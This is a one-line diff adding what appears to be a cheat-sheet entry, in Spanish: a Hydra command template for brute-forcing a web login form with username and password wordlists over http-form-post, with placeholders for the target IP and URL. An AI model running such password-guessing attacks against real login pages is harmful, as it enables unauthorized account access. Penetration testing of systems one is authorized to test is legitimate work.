@@ -1,0 +1,1 @@
+hydra (ip) http-form-post "(ruta de url):input_username=^USER^&input_password=^PASS^:Login system" -l (usuario o diccionario) -P (contraseña o dicionarioc.txt) -t 10 
